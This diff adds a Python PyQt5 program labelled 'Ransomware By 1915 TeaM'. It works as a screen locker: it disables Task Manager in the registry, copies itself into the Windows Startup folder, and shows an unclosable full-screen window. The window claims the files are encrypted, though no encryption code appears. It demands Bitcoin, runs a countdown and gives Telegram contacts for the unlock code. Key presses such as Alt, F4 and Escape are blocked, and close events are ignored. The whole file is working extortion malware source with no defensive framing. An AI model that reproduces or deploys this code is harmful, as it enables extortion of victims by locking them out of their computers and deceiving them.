@@ -1,0 +1,59 @@
+import sys,os,shutil,time,winreg,warnings
+warnings.filterwarnings('ignore')
+from PyQt5.QtWidgets import*
+from PyQt5.QtCore import*
+from PyQt5.QtGui import*
+s=os.path.join(os.environ['APPDATA'],'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
+try:winreg.SetValueEx(winreg.OpenKey(winreg.HKEY_CURRENT_USER,r"Software\Microsoft\Windows\CurrentVersion\Policies\System",0,winreg.KEY_SET_VALUE),"DisableTaskMgr",0,winreg.REG_DWORD,1)
+except:pass
+try:winreg.SetValueEx(winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System",0,winreg.KEY_SET_VALUE),"DisableTaskMgr",0,winreg.REG_DWORD,1)
+except:pass
+try:os.makedirs(s)if not os.path.exists(s)else None;t=os.path.join(s,os.path.basename(sys.executable if getattr(sys,'frozen',False)else __file__));shutil.copy(sys.executable if getattr(sys,'frozen',False)else __file__,t)if not os.path.exists(t)else None
+except:pass
+class R(QMainWindow):
+    def __init__(s):
+        super().__init__()
+        s.setWindowFlags(Qt.FramelessWindowHint|Qt.WindowStaysOnTopHint)
+        s.r, s.b, s.p = 7100, "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa", "1915teamteam"
+        s.u()
+        s.tm()
+    def u(s):
+        s.showFullScreen()
+        g=QLinearGradient(0,0,s.width(),s.height());g.setColorAt(0,QColor(25,0,0));g.setColorAt(0.5,QColor(10,0,0));g.setColorAt(1,QColor(0,0,0));p=QPalette();p.setBrush(QPalette.Window,QBrush(g));s.setPalette(p)
+        c=QWidget();s.setCentralWidget(c);l=QVBoxLayout(c);l.setContentsMargins(20,20,20,20);l.addStretch()
+        h=QApplication.primaryScreen().geometry().height()
+        bf,sf,af,tf,tmf=max(8,h//55),max(7,h//65),max(5,h//70),max(12,h//45),max(16,h//35)
+        a=QLabel("⚠️ YOUR FILES ARE ENCRYPTED ⚠️");a.setAlignment(Qt.AlignCenter);a.setFont(QFont("Arial",tf,QFont.Bold));a.setStyleSheet("color:#f33;background:rgba(0,0,0,180);border:2px solid #f33;border-radius:10px;padding:5px;margin:3px");l.addWidget(a)
+        x=QLabel("""                                                                                                                                                              
+Ransomware By 1915 TeaM """)
+        x.setAlignment(Qt.AlignCenter);x.setFont(QFont("Courier New",af));x.setStyleSheet("color:red;background:rgba(0,0,0,100);border-radius:8px;padding:3px;margin:2px");l.addWidget(x)
+        w=QLabel("🔒 YOUR FILES HAVE BEEN ENCRYPTED!\n💀 PAY THE RANSOM TO DECRYPT.\n⏰ LIMITED TIME REMAINING!\n📧 CONTACT US ON TELEGRAM.");w.setAlignment(Qt.AlignCenter);w.setFont(QFont("Arial",sf,QFont.Bold));w.setStyleSheet("color:#ff0;background:rgba(0,0,0,160);border:1px solid #f60;border-radius:8px;padding:5px;margin:3px");l.addWidget(w)
+        bc=QWidget();bh=QHBoxLayout(bc);bh.setContentsMargins(0,0,0,0);bh.addStretch();bl=QLabel(f"💰 BTC: {s.b}");bl.setFont(QFont("Monospace",bf,QFont.Bold));bl.setStyleSheet("color:#ffd700;background:rgba(0,0,0,140);border-radius:6px;padding:5px");bh.addWidget(bl);cb=QPushButton("📋 COPY");cb.setFont(QFont("Arial",sf,QFont.Bold));cb.setStyleSheet("QPushButton{background:#ffd700;color:#000;border:none;border-radius:5px;padding:4px 12px}QPushButton:hover{background:#ffed4a}");cb.clicked.connect(s.cp);bh.addWidget(cb);bh.addStretch();l.addWidget(bc)
+        s.tl=QLabel("⏰ TIME REMAINING: 01:58:20 ⏰");s.tl.setAlignment(Qt.AlignCenter);s.tl.setFont(QFont("Courier New",tmf,QFont.Bold));s.tl.setStyleSheet("color:#f33;background:rgba(0,0,0,180);border:2px solid #f33;border-radius:10px;padding:5px;margin:5px");l.addWidget(s.tl)
+        cl=QLabel("📱 TELEGRAM: @Charonx666 | @ArmeniaRansom");cl.setAlignment(Qt.AlignCenter);cl.setFont(QFont("Arial",sf,QFont.Bold));cl.setStyleSheet("color:#0ff;background:rgba(0,0,0,140);border-radius:8px;padding:4px;margin:3px");l.addWidget(cl)
+        f=QFrame();f.setStyleSheet("QFrame{background:rgba(0,0,0,180);border-radius:10px;margin:5px;padding:8px}");fl=QVBoxLayout(f);fl.setSpacing(5);il=QLabel("🔐 ENTER DECRYPTION CODE:");il.setAlignment(Qt.AlignCenter);il.setFont(QFont("Arial",bf,QFont.Bold));il.setStyleSheet("color:#ffd700;padding:2px");fl.addWidget(il)
+        rl=QHBoxLayout();rl.addStretch();s.inp=QLineEdit();s.inp.setPlaceholderText("Enter code...");s.inp.setStyleSheet(f"QLineEdit{{background:#000;color:#0f0;border:3px solid #ffd700;border-radius:10px;padding:8px;font-size:{bf+2}px;font-weight:bold;text-align:center;min-width:250px}}QLineEdit:focus{{border:3px solid #0f0}}");s.inp.setMaxLength(20);s.inp.setAlignment(Qt.AlignCenter);s.inp.returnPressed.connect(s.dc);dbtn=QPushButton("🔓 DECRYPT");dbtn.setFont(QFont("Arial",bf,QFont.Bold));dbtn.setStyleSheet("QPushButton{background:#0a0;color:#fff;border:none;border-radius:10px;padding:8px 20px}QPushButton:hover{background:#0f0;color:#000}QPushButton:pressed{background:#080}");dbtn.clicked.connect(s.dc);rl.addWidget(s.inp);rl.addSpacing(10);rl.addWidget(dbtn);rl.addStretch();fl.addLayout(rl);hint=QLabel("(After payment, contact Telegram for your code)");hint.setAlignment(Qt.AlignCenter);hint.setFont(QFont("Arial",sf-1));hint.setStyleSheet("color:#888;padding:2px");fl.addWidget(hint);l.addWidget(f)
+        s.st=QLabel("⚠️ ENTER CODE AND CLICK DECRYPT ⚠️");s.st.setAlignment(Qt.AlignCenter);s.st.setFont(QFont("Arial",sf,QFont.Bold));s.st.setStyleSheet("color:#f88;background:rgba(0,0,0,120);border-radius:6px;padding:4px;margin:3px");l.addWidget(s.st);l.addStretch();s.inp.setFocus()
+    def tm(s):s.tmr=QTimer();s.tmr.timeout.connect(s.ut);s.tmr.start(1000);s.ud()
+    def ut(s): 
+        if s.r>0:
+            s.r-=1;s.ud()
+        elif s.r==300:s.st.setText("🔥 Zagros Ransomware 🔥")
+        else:s.tmr.stop();s.tl.setText("⏰ TIME EXPIRED - FILES LOST ⏰");s.st.setText("❌ YOUR FILES ARE LOST FOREVER ❌");s.inp.setEnabled(False)
+    def ud(s):h=s.r//3600;m=(s.r%3600)//60;sec=s.r%60;s.tl.setText(f"⏰ TIME REMAINING: {h:02d}:{m:02d}:{sec:02d} ⏰")
+    def cp(s):QApplication.clipboard().setText(s.b);s.st.setText("✅ BTC ADDRESS COPIED! ✅");QTimer.singleShot(2000,s.rs)
+    def rs(s):
+        if s.r>0:s.st.setText("⚠️ ENTER CODE AND CLICK DECRYPT ⚠️");s.st.setStyleSheet("color:#f88;background:rgba(0,0,0,120);border-radius:6px;padding:4px;margin:3px")
+    def dc(s):
+        t=s.inp.text()
+        if t==s.p:
+            s.st.setText("✅ DECRYPTION SUCCESSFUL! FILES DECRYPTED... ✅");s.st.setStyleSheet("color:#0f0;background:rgba(0,0,0,180);border:2px solid #0f0;border-radius:8px;padding:8px;font-weight:bold");QApplication.processEvents();time.sleep(1);QApplication.quit();sys.exit(0)
+        elif len(t)>=4:
+            s.st.setText("❌ INVALID CODE! TRY AGAIN ❌");s.st.setStyleSheet("color:#f00;background:rgba(0,0,0,180);border:2px solid #f00;border-radius:8px;padding:8px;font-weight:bold");QTimer.singleShot(1500,s.rs);s.inp.clear();s.inp.setFocus()
+        else:
+            s.st.setText("⚠️ PLEASE ENTER THE CODE ⚠️");s.st.setStyleSheet("color:#f60;background:rgba(0,0,0,180);border:2px solid #f60;border-radius:8px;padding:8px;font-weight:bold");QTimer.singleShot(1500,s.rs)
+    def keyPressEvent(s,e):
+        if e.key() in [Qt.Key_Alt,Qt.Key_F4,Qt.Key_Escape,Qt.Key_Delete,Qt.Key_Tab]:pass
+        else:super().keyPressEvent(e)
+    def closeEvent(s,e):e.ignore()
+if __name__=="__main__":a=QApplication(sys.argv);w=R();w.show();sys.exit(a.exec_())
